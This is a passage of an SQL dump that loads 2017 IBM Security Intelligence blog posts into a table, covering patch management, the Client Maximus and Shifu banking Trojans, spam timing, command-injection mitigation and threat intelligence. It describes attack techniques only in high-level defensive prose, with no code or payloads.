system into a virtual coin miner for the attacker. The most common methods of attack include: One of the most successful methods of infiltration that we see is the failure to validate input fields on web applications. It is surprising to see how many times we have detected SQLi and CMDi commands actually being injected via a simple search box or URL fields. To shut down the virtual mint trying to form on the infrastructure you protect, applying standard security precautions is the top priority. Security professionals should take the following steps: Creating a one-stop shopping solution for preventing miners from being executed in your environment is almost impossible because so many variables exist. Focus on your network specifics and take every precaution to identify and lock down the applicable entry points of malware and miners alike.', '\'Bitcoin\', \'Bitcoin Mining\', \'Cryptocurrency\', \'Cryptocurrency Miner\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'Malware\', \'Monero\', \'X-Force\'', 'https://securityintelligence.com/network-attacks-containing-cryptocurrency-cpu-mining-tools-grow-sixfold/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (77, 'Downward Trend in Publicly Available Exploit Code? Don’t Ease Up on Patch Management Just Yet', 'Lyndon Sutherland', '2017-9-14', 'The IBM X-Force Vulnerability Database (XFDB), which holds over 100,000 publicly disclosed vulnerabilities, is chock-full of insights concerning the cybersecurity threat landscape. Much of the data is publicly available directly on the   platform and can be accessed by users anytime. In reviewing the database on an ongoing basis, the IBM Security Threat Research Group found a particularly interesting trend persisting over the last five-plus years. It appears there has been a near-constant decline in publicly available exploits or proof-of-concept (PoC) code for known vulnerabilities, in contrast to past trends where those exploits were made public, shown a full PoC, sold or even shared freely on hacking forums.\n \n \n Not having the exploits publicly available to general internet users can be a good thing. It may result in fewer malicious actors adopting exploits and using them in attacks. But this sword is double-edged: It can also enable threat actors who do find exploits and know how to use them to keep them from others and deploy them in attacks that would inevitably be more surprising and damaging.\n The downward trend in free, publicly available exploits has a lot to do with the growing underground economy and organized cybercrime. Due to their high demand and profitability, many exploits do not reach the public sphere and are sold on the   on their own or as part of exploit kits.\n Fewer publicly available exploits may lower risks associated with script kiddies and low-budget attackers. However, it does not decrease the risk of attackers that are willing to pay for exploit code already integrated in an easy-to-use exploit framework. While a decline in publicly available exploits is welcome news, we advise against modifying your organization’s security posture in a way that would place less emphasis on patching or managing risk of exploitable resources on your networks.\n Think of it as a neighborhood crime report: A downward trend in neighborhood crime doesn’t necessarily mean it’s safe to leave your doors and windows unlocked. It would still be wise to make every effort possible to secure your home. The same can be said for enterprise networks. Another important point is that the availability of exploit code doesn’t necessarily correlate to the amount of malicious activity coming across the organization’s network, nor does it reduce the susceptibility of compromise.\n An attacker only has to exploit one unpatched vulnerability to gain a foothold in a target network, potentially leading to millions of dollars in data breach costs. According to the Ponemon Institute’s “ ,” the average cost of a breach in the U.S. is $7.35 million. For example, a major U.S. insurance company recently paid $5.5 million for a breach that occurred in 2012, resulting in the compromise of 1.2 million customer accounts, according to  . Attackers had exploited a vulnerability in a third-party application for which a patch had been released three years prior to the incident.\n This type of incident highlights the importance of patching older vulnerabilities, not just newer, high-profile flaws. In fact, IBM X-Force identified several attacks in 2017 that attempted to exploit vulnerabilities noted in a 2016   article. From 2014’s OpenSSL Heartbleed Vulnerability (CVE-2014-0160) to a 2008 remote code execution vulnerability in Microsoft Server Service (CVE-2008-4250) exploited by the infamous Conficker worm, these threats may not be as prevalent as they once were, but they are still present and can result in a breach by even the lesser breed of attackers.\n Patch management is not one of the most exciting parts of treating risk, but it is arguably one of the most important controls. The best way to reduce risks associated with vulnerabilities is to mitigate the flaws themselves. In the case of  , even if an attacker was able to connect to an open Secure Message Block (SMB) port or deliver an exploit by email, the attack could have failed if the relevant   had been applied on the target systems on time.\n Good patch management practices usually establish installation deadlines based on multiple criteria, including the potential impact of a vulnerability, availability of details or exploit code and evidence of exploitation occurring in the wild. For example, a remote code execution vulnerability for which there are no known exploits or reports of exploitation could be considered highly important and assigned a patch installation target of one week. However, if there is an exploit publicly available or reports of exploitation in the wild, installing the available patch may be considered critical and assigned an installation window of 48 hours.\n There are several publicly available systems that can be used to rate vulnerabilities. Perhaps the most notable and widely used is the  . This well-documented system enables vendors to provide ratings for vulnerabilities and allows for further refinement of a base score by including environmental factors in the final rating.\n Keeping detailed inventory of the various operating systems, servers and applications within the environment is also important for effective patch management. An inventory of assets is the very first step toward classifying and prioritizing the systems that may need patching.\n Even without a complete inventory, there are some obvious targets that should always be kept up to date due to their high usage rate and high target ranking for attackers. These are operating systems and prevalent applications such as web browsers, office packages, PDF readers, Java and Flash. Security updates rated as critical or high should be installed as soon as possible, since these are arguably the most exploited attack surfaces. Unless otherwise unavoidable, unsupported operating systems or applications should not be in use. If they are, the organization must adapt mitigating controls to protect them until they can be decommissioned.\n An   platform can help organizations gain full visibility into their constantly changing endpoint landscape while bridging the gap between threat detection and remediation. A publicly available   shows how this type of tool helped one company reduce its patch deployment times by 80 percent.\n Applying available patches in a timely fashion will greatly reduce exposure and risk. Unfortunately, this best practice can’t assist with all   and exploits. Furthermore, patches aren’t always available for vulnerabilities, even years after the disclosure. In fact, let’s take a look at Figure 1 again, this time adding a column showing the number of vulnerabilities disclosed each year with publicly available exploits that don’t currently have patches:\n \n \n Comparing 2017 to any one of the past five years reveals a worrying decline in exploitable vulnerabilities for which a patch has been issued. Within that period of time, two-thirds of the vulnerabilities with publicly available exploit code do not have patches available. That is why it’s important to build   into the overall risk mitigation program.\n Vulnerability assessment and management is just one aspect — albeit a very important one — of the  . It’s important to determine your organization’s specific needs when identifying appropriate controls and solutions for each case, depending on the types of systems and users the organization relies on.\n Sounds overwhelming? It doesn’t have to be. We encourage seeking the guidance of   when making these important decisions for your enterprise and maintaining a continuum of security policies, procedures and risk management throughout the life cycle of any project.', '\'Exploit\', \'IBM X-Force Research\', \'Malware\', \'Patch\', \'Patch Management\', \'Vulnerabilities\', \'Vulnerability Management\', \'WannaCry\', \'X-Force\'', 'https://securityintelligence.com/downward-trend-in-publicly-available-exploit-code-dont-ease-up-on-patch-management-just-yet/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (78, 'What Do Avocados and Threat Intelligence Have in Common?', 'Pamela Cobb', '2017-9-13', 'Full disclosure: I would not eat guacamole for years because a certain puppet-centric movie I saw as a child had me convinced that it was actually made of frog brains. Once in college, however, seeing guacamole being made completely changed my opinion — unlike a sausage-making demonstration in a rather unfortunate public speaking class that same year of college. The creamy avocado combined with the brightness of lime juice and the right balance of fresh tomato and onion amounts to perfection. Like guacamole, a security solution needs a perfectly balanced combination of ingredients to maximize the value of the threat intelligence it processes. But before going down this analogical path, let’s review the key tenet of useful threat intelligence: It  . That means the right intelligence at the right time. Anyone familiar with avocados knows the timing has to be perfect to yield delicious guacamole. The same goes for threat intelligence. If served too soon, both the avocado and threat intelligence are difficult to penetrate and don’t add anything. The right threat intelligence at the wrong time is almost entirely useless. Placing your threat intelligence in a metaphorical brown paper bag with an apple overnight does nothing to help it ripen, either. At the other end of the spectrum, an overripe avocado served too late is mushy and meaningless. Similarly, threat intelligence that could have been helpful but is received after, or even during, a breach is infuriatingly inadequate. The right time frame for a ripe avocado is two to three days, but that window is even shorter for threat intelligence. Minutes matter when it comes to identifying malicious IP addresses attempting to connect with your network, rogue web applications and malicious files. We’ve talked before about the   ratio of threat intelligence and how important it is to find and use the right threat intelligence. Likewise, a plethora of avocados that ripen simultaneously is unhelpful, unless you are planning a massive party to help eat all that guacamole. Security operations center (SOC) analysts and security practitioners need data to make better decisions, but relevant threat intelligence is even more crucial. Otherwise, alerts, notifications and log events just become noise and are ignored. A well-tuned   can help prioritize and bring together different data sources to create meaningful alerts that correlate to known indicators of compromise (IoCs). I could make a really pithy WannaCry and onion association here, but I think I’ve tortured you enough with the avocado and threat intelligence analogy, so let’s skip to the main point. When   hit, the research team at IBM X-Force kept a   of IoCs and insights updated as new information came to light. It was an excellent source of actionable IP addresses, MD5 checksum hashes and even security product coverage for this ransomware campaign. By taking advantage of   applications and STIX over TAXII protocols, analysts were able to import this public collection into a variety of security information and event management (SIEM) tools to protect their own networks. The powerful correlation and prioritization capabilities of a threat intelligence app make it easy to identify threats in light of the massive amounts of data being fed into the SIEM, particularly if you aim to improve your ability to make security decisions with context from external threat intelligence. If you’re an existing QRadar user, I highly recommend checking out the   to take advantage of the corpus of information from X-Force Exchange.  QRadar’s powerful correlation and prioritization capabilities make easy work of identifying threats in light of the massive amounts of data being fed into the SIEM. If you’re not a QRadar user but still want to take advantage of the wide range of threat intelligence available from X-Force Exchange, you can sign up for a   of the X-Force Exchange Commercial API to try it yourself.', '\'IBM X-Force Exchange\', \'Information Sharing\', \'Ransomware\', \'Threat Intelligence\', \'Threat Sharing\', \'WannaCry\', \'X-Force\'', 'https://securityintelligence.com/what-do-avocados-and-threat-intelligence-have-in-common/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (79, 'Brazilian Malware Client Maximus: Maximizing the Mayhem', 'Omer Agmon', '2017-9-12', 'In January 2017, IBM X-Force research reported the development of a new remote-access malware code targeting Brazilian banks. The malware, dubbed  , was observed in ongoing campaigns and continues to target online banking users in the country. The development of Client Maximus, which is believed to be commercially available in Brazilian fraud and cybercrime communities, continues as new variants of the malware emerge.\n IBM X-Force recently analyzed a new and upgraded version of the malware. Client Maximus appears to have been written specifically for attacks against Brazilian banks. Analysis of   of this code led our researchers to the overall understanding of the growing sophistication of cybercrime tools in Brazil.\n \n The initial infection routine begins with an obfuscated LNK file that runs CMD.exe /c with PowerShell.exe as a parameter. PowerShell, in turn, gets its own parameter, a Base64-encoded script, which is immediately executed before it downloads another file from the attacker’s control server and executes it.\n An interesting note about the initial LNK file being used by Client Maximus is that the complete Base64-encoded PowerShell script is not visible in the Windows user interface, even when clicking “Properties” on the file. It is only visible to a dedicated ShellLink parser or hex editor.\n We decoded the PowerShell code from its Base64 format and received the following:\n The resulting downloaded file is yet another obfuscated PowerShell script that fetches a .NET assembly named “Loader.” That element is dynamically loaded as follows:\n The next step is the execution of what the malware’s developer named a “Go” method on the dynamically loaded assembly (see code in   REF _Ref492900569 \\h \\* MERGEFORMAT Figure 1 ):\n \n The “Go” method performs the following checks on the environment as a means to evade discovery by unwanted parties and anti-malware tools:\n After the loader’s run, the original PowerShell script proceeds to create two files: \n In the last step before the payload arrives, the PowerShell script executes the LNK file, which, in turn, executes the VBS file:\n The malware’s payload itself comprises four randomly named files. On our sample during the analysis, those files came up as:\n \n File names will vary between variants and machines, as the malware randomly prenames them before actual creation. Let’s have a look at what these components do.\n This file contains only the .NET-supported runtimes for the associated executable file that carries the same name. It is of little value in that sense.\n This file presents known .NET WinForm software for the legitimate encryption/decryption process of PowerShell scripts, usually by IT administrators. WinForm, or Windows Forms, is a graphical class library included as a part of the Microsoft .NET Framework that provides a platform to write rich client applications for desktop, laptop and tablet PCs. This specific instance is known as PShellExec. In the context of the malware’s operation, it is used to decrypt the heavily obfuscated PowerShell script, noted as 2620343c, using the Zebra Bank Structure (ZBS) file as an argument.\n \n To make debugging more arduous, the malware’s developer ensured that the runtime obfuscation of strings and some junk code is multi-threaded.\n ZBS files are typically used for data structure input/output. This file is, in reality, .NET-emitted code saved as a compressed byte array and encoded in Base64. This assembly, called  Scripter.exe, is also quite heavily obfuscated and is loaded at runtime by the first executable using  Assembly.Load(byte[]) and MethodInfo.Invoke(). \n The output of  WindowsAnytimeUpgradeResults.exe is an obfuscated PowerShell script that performs remote loading of a dynamic link library (DLL) into a remote process, practically replacing Windows Loader. This technique, called  , is part of the PowerSploit suite, which offers various other features, such as logon token exfiltration and persistence techniques.\n This final PowerShell code creates a new  cmd.exe process and uses the DLL above to inject its payload into the legitimate cmd.exe process:\n \n The following diagram gives an overview of the infection routine applied by this new variant of the Client Maximus banking malware:\n \n Once the endpoint has been successfully infected with the malware, Client Maximus will continually monitor the user’s browsing activity. When the user tries to reach his or her bank’s website — if that bank is on the malware operator’s target list — Client Maximus will go into action.\n The malware’s top-level modus operandi is simple, yet effective:\n Client Maximus’ modus operandi is not much different from previous malicious code categorized under the remote overlay family. The scheme appears in further detail in our   about Client Maximus.\n In 2017, IBM X-Force is seeing an ongoing escalation of malware codes in Brazil. After   with external parties, it appears that there has been a permanent step-up in sophistication of malware codes.\n On top of frequently seeing new Client Maximus variants operated by different actors and the upgrade the malware has recently undergone, X-Force researchers also found a new code being propagated in Brazil. The code is named Vernon, and more information about the malware will be available in the coming week from IBM X-Force.\n Banks wishing to protect their customers from evolving threats and cybercrime modus operandi are invited to learn more about   advanced fraud protection.\n Individuals looking for tips on protecting themselves from remote overlay malware and other banking Trojans are invited to read our   for staying safer on PC/mobile devices.\n We worked with the following MD5 hashes for this blog:', '\'Advanced Threats\', \'Bank Fraud\', \'Banking Malware\', \'Banking Trojan\', \'Brazil\', \'Cybercrime\', \'Financial Malware\', \'Fraud\', \'IBM X-Force Research\', \'Malware\', \'Overlay Attack\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/brazilian-malware-client-maximus-maximizing-the-mayhem/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (80, 'Spotlight on Energy and Utilities Sector: Attacks Targeting ICS Systems Projected to Increase', 'Michelle Alvarez', '2017-9-6', 'There is an   on cybersecurity among governments and energy and utilities organizations worldwide, and for good reason. Attacks on critical infrastructure such as fuel, electricity and drinking water carry the potential for damage far beyond their economic impact. As demonstrated by incidents such as the notorious shutdown of several Iranian nuclear centrifuges by   in 2010, and the   attacks in November 2016 and January 2017 against Gulf state organizations, the stakes for energy and utilities companies are higher than ever. The health and welfare of whole nations could potentially be at risk. A great many industrial control system (ICS) configurations, including SCADA systems, distributed control systems (DCS) and programmable logic controllers (PLCs), are operating in the energy and utilities industry. In December, IBM X-Force Threat Research reported that   increased by more than 110 percent in 2016. At midyear 2017, attacks are projected to equal or possibly surpass the volume observed in 2016. \n In the energy and utilities sector, IBM Managed Security Services (MSS) 2016 data revealed that unintentional and malicious attacks were made up of 60 percent outsiders and 40 percent insiders. Within the insider group, there were more inadvertent actors (24 percent) than   (16 percent). \n IBM MSS analysis of 2016 data also revealed that the top attack vector, which involved the use of malicious input data to attempt to control or disrupt a system, targeted 60 percent of the energy and utilities clients monitored by IBM X-Force. That figure was notably higher than the 42 percent average across all industries. \n From network break-ins to   to  , attacks against energy and utilities companies are on the rise A proper assessment of information security risk is critical to the effective direction of your IT investment, critical assets and utilization of resources. Refer to the IBM report, “ ,” for recommendations to consider when making strategic decisions to help safeguard your business.', '\'Energy and Utilities\', \'Energy Industry\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'Industrial Control Systems (ICS)\', \'Insider Threat\', \'Malware\', \'Ransomware\', \'SCADA\', \'Stuxnet\', \'X-Force\'', 'https://securityintelligence.com/spotlight-on-energy-and-utilities-sector-attacks-targeting-ics-systems-projected-to-increase/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (81, 'The Educator’s Back-to-School Cybersecurity Checklist: Make Mitigating Command Injection a Priority', 'Michelle Alvarez', '2017-8-30', 'Pencils? Check. Notebooks? Check. Web applications and servers patched and sanitized? Hopefully. In many parts of the world, educators and students in primary, secondary and higher education institutions are reviewing their checklists to ensure academic preparedness for the new school year. But what about the education sector’s IT workers? What should be at the top of their cybersecurity checklists? According to X-Force analysis of 2016 data, the top attack vector targeting 42 percent of X-Force-monitored clients involved using malicious input data to attempt to control or disrupt the target system. Command injection, which includes operating system command injection (OS CMDi), SQL injection and other types of code injection, belongs in this category. When assessing attacks targeting the education sector, this percentage jumps to 63 percent. \n This statistic illustrates the need for the education sector to take steps to thwart command injection attacks. Earlier this year, an attacker   to the computer systems of dozens of universities in the U.S. and U.K. through SQL injection. In another reported incident, a gray-hat security researcher accessed   from an educational institution in India using an SQL injection exploit. In fact, in the last five years,   data revealed that SQL injection incidents were one of the most reported types of incidents in the education sector, second only to malware incidents. Heavily regulated industries such as education have higher data breach costs. According to the Ponemon Institute’s “ ,” the average cost for each lost or stolen record containing sensitive and confidential information in the education sector is $200, substantially higher than the overall mean of $141. The victims of breaches in the education sector range from current employees and students to students’ parents, alumni and donors. Attackers’ interest in this sector is evident: Data that could be obtained from these breaches include names, addresses, login information such as passwords and usernames, email addresses, Social Security numbers and even  . Command injection attacks affect most industries, and mitigation techniques are applicable across all sectors — including education. Security professionals in all industries should complete the following steps to reduce command injection attacks. Why does   remain prevalent across all X-Force-monitored industries nearly three years after its initial outbreak? Cybercriminals know there are large numbers of unpatched command injection vulnerabilities (new and old) in web applications and servers. To mitigate these attacks, patching and maintaining current software versions is essential. The dilemma is that managing and deploying patches for multiple operating systems and applications across hundreds of thousands of endpoints can be challenging for administrators. Fortunately,   can help organizations automate and simplify the patching process. There are many ways attackers can exploit unsanitized input data, so data sanitization must be comprehensive. Filter all user input, and use prepared statements and object-relational mapping (ORM) with parameterized queries. Form and URL data needs to be validated for potentially malicious characters. Examples of these can be found in the IBM report, “ .” Test your web servers for command injection vulnerabilities and your applications for input validation errors on a regular basis using  . Unfortunately, tool-based testing can only go so far in today’s modern threat landscape. That’s why it is just as important to engage teams that perform  . There are an increasing number of third-party programs for students, parents, teachers and school administrators, all with varying levels of access. Education management solutions such as PowerSchool, Skyward, MySchoolApps, SchoolDude and Applane are meant to enhance the experience for all participants, but they can also open the education sector to additional vectors of cyberattack. Attention to third-party application security is a growing need throughout the sector. While many students and staff take time off between semesters, cybercriminals operate year-round. Servers and websites don’t go offline while school is not in session, making them a potential target at any point in the year. Now is a good time to review the above checklist and then make it a priority to revisit these recommendations periodically.', '\'Academia\', \'Data Protection\', \'Data Security\', \'Education\', \'IBM X-Force Research\', \'Injection Attacks\', \'Third-Party Vendors\', \'Webinjection\', \'X-Force\'', 'https://securityintelligence.com/the-educators-back-to-school-cybersecurity-checklist-make-mitigating-command-injection-a-priority/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (82, 'All in a Spammer’s Workweek: Where Do the Busiest Spammers Work Around the Clock?', 'Limor Kessem', '2017-8-21', 'IBM X-Force Kassel is a research team that operates massive spam honeypots and monitoring, gleaning data from billions of unsolicited emails every year. With such large amounts of spam coming in, we can more easily map trends. We looked at one recently when analyzing the spammer’s workweek. Our goal in this analysis was to delve into six months of data to gain insight into when spammers and their spam bots do the most work, by weekday and hour range. We also aimed to look at the countries where spam originates to figure out where the hardest-working spammers go to launch their malicious schemes. To examine these geospecific tendencies, we used the IP address of the spam’s sender to define the source geography. Our data range was December 2016 to June 2017. The first finding we looked at is the weekly trend of how spam works. In the past, we’ve found that spammers are an organized bunch, and they plan their workdays around business hours. The data in our traps confirmed that this trend still holds true. Over 83 percent of all spam was sent during weekdays, with significant drops on weekends across the different geographies where spam messages originated. Over the six-month period we analyzed, the biggest day for spam was Tuesday, followed by Wednesday and Thursday. \n \n Looking at the hour range during which most spam was sent out, we observed a hike right around 5 a.m. Coordinated Universal Time (UTC) during weekdays, which is only 1 a.m. on the U.S. East Coast. That’s because spammers start off with Europe before they follow the sun and start spamming recipients in the U.S. The big drop in spam comes at around 8 p.m. UTC, or 4 p.m. EST, but some spamming lingers thereafter, likely only in the U.S. at that point. This trend coincides with the focus of different malware families, such as banking Trojans and ransomware, to target organizations and not just indiscriminate users on their email accounts. Trojans such as  ,   and   are cybergang-owned malware designed to rob business bank accounts. As such, these gangs make sure to spam employees in very pointed bouts of  , during those times in which potential new victims are more likely to open incoming email. In the different zones on the globe, X-Force data showed that spammers like to get their sleep at night, even though there was an undercurrent of some spam activity that persists 24 hours a day. X-Force data shows that although the lion’s share of spam is indeed sent during the week, there are still spammers and spam bots working the weekend shifts. Those who operate during those days appear to be sending unsolicited email at all hours of the day and night. The spam peaks start at midnight, with a second peak at about 1 p.m. It starts dying down around 11 p.m., only to start up again at midnight. \n Using the data to look at the geographic source of the spam messages, we did consider the fact that criminals could be spamming from an entirely different country but contracting out services and resources from across the seas. With that, the origin of spam is still the significant factor because malicious actors will typically   from within their own country to appear more legitimate and attempt to bypass some geography-based spam filters. Looking at the numbers, the top originator of spam in the past six months was India. Runners up were South America and China, respectively. \n Daily trends in some countries were similar. For example, the entire European region showed the same trend of sending spam during the daytime Monday through Friday and dropping in the evening. India and South America also looked pretty similar: Most spam is sent during the day, and the volumes drop at night. The trend was a tad different in Russia, where most spamming took place Thursday and Saturday, without any major changes on all other days of the week. It seems like spammers sending email from Russian IP addresses are active throughout the week. However, the similarity found between North America and China was somewhat surprising. In those regions, spam was the most constant and consistent throughout the week, without a notable drop at any point. One of the biggest botnets in the world is the  , a major threat that spreads spam for some of the most notorious cybergangs on the internet. Botnets such as Necurs never sleep, and their zombie members can be programmed to spew out spam at any time of day. Are spam statistics disconnected from human operators who work to send spam? While it is true that many spam blasts are automated, there is a lot of work that still goes into each carefully planned campaign. Botnet operators are constantly looking for new ways to circumvent spam filters and make it through to recipients’ inboxes without being blocked or their malicious attachments being disabled. If we look at Necurs again, this botnet alone has been shuffling its delivery tactics very frequently in the past few months, moving from lacing Microsoft Office documents with malicious exploits, to poisoned PDF files embedded with a laced Office file, to sending malware in  . Most recently, the cybergang has been delivering   attachments just to keep evading security, look legitimate and deliver the nefarious payload. Studying the trends that move illicit spamming and the mechanisms that enable cybercrime is an essential part of threat intelligence and situational awareness for any organization. Nowadays, malware is more sophisticated than ever, and its delivery methods are not falling short. Spammers and spam botnets launch millions of malicious messages every day, hoping to get through to potential victims, infect new endpoints, invade another organization and keep rolling the cash laundromat that drives cybercrime. By learning their methods and tracking their activity, defenders can better manage risk and keep their organizations safer from spam. IBM X-Force research continually updates research findings, threat intelligence and indicators of compromise (IoCs) on  . Join us today to keep yourself and your organization up to date, and to collaborate with the largest security teams in the world to fight cybercrime.', '\'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Phishing\', \'Phishing Emails\', \'Ransomware\', \'Spam\', \'X-Force\'', 'https://securityintelligence.com/all-in-a-spammers-workweek-where-do-the-busiest-spammers-work-around-the-clock/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (83, 'Incident Response and Threat Intelligence: A Potent One-Two Punch to Fight Cybercrime', 'Security Intelligence Staff', '2017-8-17', 'Cybercriminals and their tactics are becoming increasingly sophisticated. Given the rash of widespread, devastating attacks thus far in 2017, this trend shows no signs of slowing down. It’s no longer enough to simply implement incident response solutions. Today’s threats require a dedicated team of security experts to maximize these tools with dynamic, continuously updated threat intelligence. At the recent Black Hat event,  , global research lead for IBM X-Force Incident Response and Intelligence Services (IRIS), took the time to share his thoughts on some of the major threats that have wreaked havoc so far in 2017. He also discussed the successes of X-Force IRIS and revealed why combining   into a single team is so crucial to the fight against cybercrime. This year, we’ve seen some huge global events utilize   to take down customers’ environments. These types of attacks are truly impactful to people’s businesses and people’s lives. I think what we’ve seen so far really highlights the need for visibility within networks and underscores the need for companies to have a good incident response plan so that they know how to respond in the face of these huge global incidents. At the end of the day, it comes down to having visibility within your network as well as the speed at which you’re able to respond. These are two lessons the industry has learned from recent events, especially those that were as widespread as WannaCry and Petya/NonPetya. IRIS is indeed two different practices within one. And the combination of incident response and intel really does  . I am the global lead for research on the IRIS Intel team, and we learn a lot from incident response incidents. We’re on the ground when attackers are most likely active in an environment, so we’re able to collect a lot of data and understand how the attacks and attackers are actually operating. But we’ve also been through a lot of cases and do a lot of external research so that once we start dealing with a particular threat actor or a particular technique or methodology, we very likely already know what it is. And then we, of course, try to determine how to respond appropriately to the given threat. By having the incident response team on the ground and the intel team helping support them not only with collection of data, but also providing operational and tactical data to the team on the front line, we can provide a really good response service to try to figure out root cause analysis and also stop attackers from actually accomplishing their goals. As I just said, we do a combination of intelligence work and incident response work for our customers. Earlier this year, we responded to a couple Shamoon incidents.   is another piece of destructive malware, one that is a more targeted than, say, WannaCry. But we ended up focusing not on Shamoon directly, because a lot of people already knew what Shamoon was doing, which was destroying networks. So instead, we tried to focus on the other parts of the attack life cycle, like how did these attackers who were using Shamoon actually get within victim environments? How did they escalate privileges and then move the Shamoon malware throughout the network to take it down? We were actually able to do a lot of research to try to figure out how this particular set of actors who were responsible for Shamoon ended up getting within victim environments. What we ended up finding is that they were using spear phishing emails with an attachment, utilizing a malicious Word document that utilized a macro that invoked PowerShell. While most people were just focusing on the end results of these attacks, we were striving to understand how the attackers went about their attack and what they did to accomplish their mission once they were in. I consider this one of our biggest successes because, ultimately, we were able to provide our data and analyses and intelligence to our customers so that they could defend themselves and, getting back to the importance of speed, also respond much more quickly in the future to prevent an attack like Shamoon. On the intel side, what IRIS is trying to do is focus on all the different threat actors and track as much of their activity as we can. Again, we want to spot them across the entire attack life cycle, not just looking at the final goal of what they’re trying to accomplish, but understanding how they get to that point. Just as in the case of Shamoon, we’re continually asking: How do these threat actors first get into the network? How do they escalate privileges? How do they move laterally? What types of tools and infrastructure are they using? By tracking these types of activities, we can improve not only IBM Security Services such as our incident response practice, but also  . If we’re able to track all the different malware and techniques that threat actors are using, we can build it into detection and into our response plans on the services side and also in our IBM products.', '\'Advanced Attacks\', \'Cyberattacks\', \'IBM X-Force Incident Response and Intelligence Services\', \'IBM X-Force Research\', \'Incident Response (IR)\', \'Petya\', \'Threat Intelligence\', \'WannaCry\', \'X-Force\'', 'https://securityintelligence.com/incident-response-and-threat-intelligence-a-potent-one-two-punch-to-fight-cybercrime/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (84, 'Stay Up to Date on Threat Intelligence With New X-Force Exchange Capabilities', 'Pamela Cobb', '2017-8-16', 'As both a parent and a bit of a nerd, I have a lot of corny jokes in my arsenal that cover a wide range of topics including animals, food, science fiction and the like. One of my favorite jokes comes from my data science background: “I never metadata I didn’t like.” This joke has it all: wordplay, the spirit of a joke your uncle might tell and even a tangential “Star Trek” tie-in. It also relates to  . When the IBM X-Force Exchange (XFE)  , the platform capabilities solidly supported collaboration and security investigation workflow. Since then, agile development has built up an even more robust set of features to make both collaboration and investigations even easier. \n In the past few months,   have gotten more robust. A user who is not logged in to the X-Force Exchange will be notified of updates to major capabilities in the upper right corner by the bell icon. A logged-in user will see a number of additional notifications available, ranging from feature updates to content and collaboration updates. In addition to new capabilities, new content notices, such as groups to which you’ve been added or collections that have been shared with you, will be highlighted on the notifications page. The platform also displays recently published data from the   team. These public X-Force collections and advisories are incredibly helpful for security analysts because they provide ready-made, validated research and indicators of compromise (IoCs) for active campaigns such as the recent   and   malware outbreaks. Once viewing the collection, you can follow it to get on-platform notifications when new content is added or the notes are updated. You can even subscribe to off-platform notifications by adjusting the user settings on XFE if you’d like to be emailed when followed collections are updated. By customizing the   experience, you can ensure that you are receiving the content you need to facilitate investigations and remediation actions. Watch our on-demand webinar on   to learn more about the platform and its capabilities.', '\'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Information Sharing\', \'Petya\', \'Threat Intelligence\', \'Threat Sharing\', \'WannaCry\', \'X-Force Features\'', 'https://securityintelligence.com/stay-up-to-date-on-threat-intelligence-with-new-x-force-exchange-capabilities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (85, 'Where Are They Today? Cybercrime Trojans That No One Misses: Shifu Malware', 'Limor Kessem', '2017-8-8', 'Cybercrime is a very dynamic threat landscape. With over 100 million malware strains tracked by   in 2016, malware can be a  . When it comes to the more organized cybercrime groups and sophisticated banking Trojan projects, malware families are more defined and easy to recognize. These threats advance at a trackable pace and their targets are regularly monitored by IBM X-Force. Gang-owned malware helps its operators steal untold amounts of money. These codes do not typically go away without a publicly visible reason, such as a shutdown by law enforcement. However, there are some notable exceptions. According to IBM X-Force data, a few major cybercrime groups did crawl out of the spotlight slowly and for no apparent external reason in 2017. Some names that come to mind are Shifu, Tinba,  , Qadars and GozNym. Where were these malware codes before, and where are they today? \n Shifu is a sophisticated banking Trojan that was discovered by X-Force Research in  . According to X-Force analysis of Shifu’s code, this malware borrowed some of its central mechanisms and configuration style from other well-known banking Trojans, such as Shiz, Gozi, Zeus and Dridex. This brought it to a highly functional level right from the moment of its release. At the time of discovery, Shifu’s targets were found to be mostly in Japan, but it didn’t take long for the malware to   and other parts of Europe. With unique code mesh and  , it was evident to X-Force researchers that Shifu was created by malware veterans. This suspicion was reinforced by its configuration files that targeted business and wealth management accounts, alluding to the operators’ ability to steal and cash out heftier sums than schemes targeting consumers. This is yet another characteristic of an organized and resource-backed group. X-Force monitoring of Shifu’s activity showed it was quite active in 2016, leveraging the Angler exploit kit to spread around during the months following its release. The operators were starting to collaborate with   that supplied webinjections to other gangs and used them to launch intermittent attack campaigns in Japan and the U.K. Shifu evidently had friends in the right places. Shifu’s developers worked on the code through 2016, adding modified functionality for infected endpoints outside of Japan. By January 2017, Shifu received its  , proving that much more work was underway for the Trojan. Meaningful modifications included exploiting different Windows mechanisms for privilege escalation and a move to   for botnet communications. This ingenious trick to evade censorship and law enforcement was previously observed in the  . This choice was yet another hint as to Shifu’s network of friends in the cybercrime arena. It also reinforced Shifu’s striking resemblance to the Shiz banking Trojan, which disappeared in 2014 and most likely served as the inspiration and source for Shifu’s code. According to X-Force Research, Shiz used to target banks in Russia, and its developer was likely located in Ukraine. This would be indicative of Shifu’s origin as well. Shifu seemed to be very focused on two main geographies — Japan and the U.K. — and was evolving steadily before it suddenly started fading out. After   were introduced into the code starting in June 2016, X-Force Research was surprised to see Shifu’s activity wane significantly with each passing month since. Looking at X-Force data from the past 12 months, we can see that Shifu’s campaigns were very small throughout the entire period. We also detected a continuous downward trend in attempted infections, which signified that the gang had stopped launching infection campaigns altogether. \n Beyond the decline in attempted attacks, the Shifu malware operators seem to have stopped trying to access victims’ bank accounts. That activity started tapering off in April 2017 after a continued decline that 